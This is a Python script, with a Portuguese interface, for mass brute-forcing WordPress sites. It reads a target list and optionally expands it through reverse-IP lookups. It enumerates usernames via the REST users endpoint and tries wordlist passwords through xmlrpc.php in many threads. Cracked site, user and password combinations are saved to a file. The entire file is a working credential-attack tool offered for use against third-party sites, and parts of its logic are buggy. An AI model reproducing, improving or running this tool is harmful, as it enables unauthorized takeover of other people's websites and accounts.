#!/usr/bin/python
#coding: utf-8

import _thread
import json
import requests
import argparse as arg
import sys
import os
import time
import re
import socket

print(''' 
    ____             __      _       __
   / __ \_________  / /_____| |     / /___ __   _____ 
  / /_/ / ___/ __ \/ __/ __ \ | /| / / __ `/ | / / _ \

 / ____/ /  / /_/ / /_/ /_/ / |/ |/ / /_/ /| |/ /  __/
/_/   /_/   \____/\__/\____/|__/|__/\__,_/ |___/\___/ 
 v2.1

[!] Brute/Scanner cms (wordpress)
[!] Mass brute force
[!] Desenvolvido por ./Cryptonking (B4l0x)
''')

parser = arg.ArgumentParser(description="Wordpress brute/scan by B4l0x")
parser.add_argument("--lista", "-l", help="Lista de sites wordpress", required=True, type=str)
parser.add_argument("--wordlist", "-w", help="Wordlist de senhas", required=True, default="wordlist.txt", type=str)
parser.add_argument("--usuario", "-u", help="Usuario alvo", default="null", required=False, type=str)
parser.add_argument("--reverse", "-rdns", help="Reverse IP Domain", default="null", required=False, type=str)
parser.add_argument("--sleep", "-slp", default="2", help="Time sleep usado no Thread", required=False, type=int)
x = parser.parse_args()

lista = x.lista
dnsok = x.reverse
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 'Cookie': 'humans_21909=1'}
usuarios = []
xmlrpcok = []
plugins=[]
temas=[]
wpok = []
sites = []
portaok=[]
tempo = time.strftime("%H:%M:%S")
alocthread = _thread.allocate_lock()

def portscan():
    print("\n[{} INFO] Verificando conexao com as url(s)...".format(tempo))
    try:
        try:
            sites = open(lista, 'r').readlines()
        except:
            print("[{} INFO] Verifique o caminho da wordlist e tente novamente...".format(tempo))
            exit()
        for site in sites:
            url = site.replace("\n", "")
            urls = url.rsplit('/')
            if (urls[2]):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(2)
                        c = s.connect_ex((str(urls[2]),int(80)))
                        if c == 0:
                            print("[{} INFO] URL: {} [80 OK]".format(tempo,url))
                            portaok.append(url)
                    except socket.gaierror:
                        #print("[{} INFO] Host não pode ser resolvido {}".format(tempo, url3))
                        continue
                    except socket.error:
                        #print("[{} INFO] Socket error!".format(tempo))
                        continue
    except:
        print("[{} INFO] Erro ao conectar com a url(s)".format(tempo))

def verwp():
        try:
            linhasfile = len(portaok)
            print("\n[{} INFO] Confirmando {} site wordpress...".format(tempo,linhasfile))
            for site in portaok:
                    try:
                        response = requests.get(site+"/xmlrpc.php", timeout=10, headers=header).text
                        logins = requests.get(site+"/wp-json/wp/v2/users", timeout=10, headers=header).text
                    except Exception as e:
                        #print("[{} INFO] URL {} [ERRO AO CONECTAR]".format(tempo, site))
                        pass
                        #exit()
                    except KeyboardInterrupt:
                        print("\n\t[{} INFO] Finalizado, obrigado por usar by B4l0x...\n".format(tempo))
                        exit()

                    if "XML-RPC server accepts POST requests only." in response:
                        xmlrpcok.append(site)
                        #print("[{} INFO] URL {} [XMLRPC] [OK]".format(tempo,site))
                        if "slug" in logins:
                            print("[{} INFO] URL {} [XMLRPC/LOGIN] [OK]".format(tempo,site))
                            wpok.append(site)
                    elif "cptch_input" or not "XML-RPC server accepts POST requests only." or "Not Found" or "404" in response:
                            print("[{} INFO] URL {} [XMLRPC Bloqueado]".format(tempo,site))
                            #print(response)
                            #exit()

        except Exception as e:
            if(str(e).startswith("HTTPS")):
                print("[{} INFO] URL {} [ERRO][SSL]".format(tempo, site, e))
                #pass
            else:
                print("[{} INFO] URL {} [ERRO AO CONECTAR]".format(tempo, site))
                #pass
                #exit()

def apireverse():
    try:
        sites = open(lista, 'r').readlines()
        total = len(sites)
        contador=0
        while contador < total:
            print("[{} INFO] Reverse IP domain").format(tempo)
            for site in sites:
                url = site.replace("\n", "")
                url2 = url.replace("http://", "")
                url3 = url2.replace("/", "")
                _captura = requests.get("https://api.hackertarget.com/reverseiplookup/?q="+url3).content
                captura = _captura.strip("").split("\n")
                for cap in captura:
                    cap1 = str(("http://"+cap+"/"))
                    salva = open(lista, 'a')
                    salva.write("\n"+cap1)
                    salva.close()
                    print(cap1)
                    contador=contador+1
    except Exception as e:
        print("[{} INFO] Erro ao obter sites no reverse ip {} \n").format(tempo,e)

def plugintema():
    try:
        print("\n[{} INFO] Iniciando scan de plugin(s) e tema(s)...").format(tempo)
        for wp in xmlrpcok:
            for plugin in plugins:
                for tema in temas:
                    responsetema_code = requests.get(wp+tema, timeout=10, headers=header).status_code
                    responseplugin_code = requests.get(wp+plugin, timeout=10, headers=header).status_code
                    if responsetema_code == 200:
                        print("[{} INFO] URL {}{} [TEMA] [OK]".format(tempo,site,tema))
                    elif responseplugin_code == 200:
                        print("[{} INFO] URL {}{} [PLUGIN] [OK]".format(tempo,site,plugin))
    except:
        print("[{} INFO] Erro ao testar plugin(s) e tema(s)").format(tempo)
        exit()

def brute(i):
        try:
            if wpok == "":
                print("\n\t[{} INFO] Brute nao pode iniciar sem sites, obrigado por usar by B4l0x...\n".format(tempo))
                exit()
            else:
                pass
            for site in wpok:
                #print(site)
                responselogin = requests.get(site+"/wp-json/wp/v2/users", timeout=10, headers=header).text
                dados = json.loads(responselogin)
                for user in dados[0:30]:
                    usuario = (user['slug'])
                    ii = i.replace("\n", "")
                    site = site.replace("https://", "http://")
                    xml='''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>'''%(usuario,ii)
                    r = requests.post(site+"xmlrpc.php", data=xml, timeout=30, headers=header).text
                    if 'isAdmin' in r:
                        alocthread.acquire()
                        print("\n\t[{} INFO] URL: {} <=> {}:{} [LOGIN EFETUADO COM SUCESSO]\n".format(tempo,site,usuario,ii))
                        os.system(str("echo {}:{}:{} >> {}".format(site,usuario,ii,"cracked.txt")))
                        alocthread.release()
                        continue
                    elif 'faultString' in r:
                        alocthread.acquire()
                        print("[{} INFO] URL: {} <=> {}:{} [Login Falhou]".format(tempo,site,usuario,ii))
                        alocthread.release()
                        continue
                    elif 'Not Acceptable!' in r:
                        alocthread.acquire()
                        print("[{} INFO] URL: {} [Firewall]".format(tempo,site))
                        alocthread.release()
                        continue
                    else:
                        continue
        except KeyboardInterrupt:
                        print("\n\t[{} INFO] Finalizado, obrigado por usar by B4l0x...\n".format(tempo))
                        exit()
        except Exception as e:
                pass
                #print("[{} INFO] Conexao perdida com o host, Reconectando...".format(tempo))
            
try:
    try:
        if dnsok != "null":
            apireverse()
        else:
            pass
        portscan()
        verwp()
        print("")
        wordlist = open(x.wordlist, 'r').readlines()
    except:
        print("[{} INFO] Verifique o caminho da wordlist e tente novamente...".format(tempo))
        exit()
    for i in wordlist:
        time.sleep(0.+x.sleep)
        _thread.start_new_thread(brute, (i,))
except KeyboardInterrupt:
    print("\n\t[{} INFO] Finalizado, obrigado por usar by B4l0x...\n".format(tempo))
    exit()
